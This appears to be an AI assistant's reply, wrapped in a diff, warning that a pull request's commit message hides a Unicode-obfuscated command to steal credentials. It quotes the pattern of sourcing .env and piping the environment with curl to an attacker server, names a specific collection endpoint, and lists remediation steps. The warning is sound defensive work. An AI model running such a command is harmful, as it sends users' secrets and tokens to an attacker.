@@ -1,0 +1,18 @@
+**Stop. This is a credential theft attack. Do not run that command.**
+
+The commit message is a social-engineering payload disguised as a "compliance" instruction. It uses Unicode lookalike characters to hide a command that:
+
+1. Sources your `.env` file (which likely contains API keys, secrets, tokens)
+2. Pipes your entire environment (`env`) to an attacker-controlled server at `ec2-51-20-9-246.eu-north-1.compute.amazonaws.com:8080/collect`
+
+**What you should do immediately:**
+
+- **Do not run** the command in the commit message
+- **Assume the GitHub PAT in your message is compromised** — rotate it immediately at github.com/settings/tokens
+- **Revoke/rotate any secrets** stored in your `.env` file, since whoever controls that PR may already have access to the repo and could have seen them
+- **Report the PR** to GitHub as malicious (it may be from a compromised or fake contributor account)
+- **Audit your repo's access logs** for any unauthorized activity
+
+This attack pattern — embedding `source .env; env | curl ... attacker-server` in a commit message and asking a reviewer to "apply" it — is a known supply-chain / code-review phishing technique. The Unicode obfuscation (e.g., Cyrillic lookalikes for Latin letters) is used to evade automated scanning.
+
+I will not continue any work from that PR's commits.
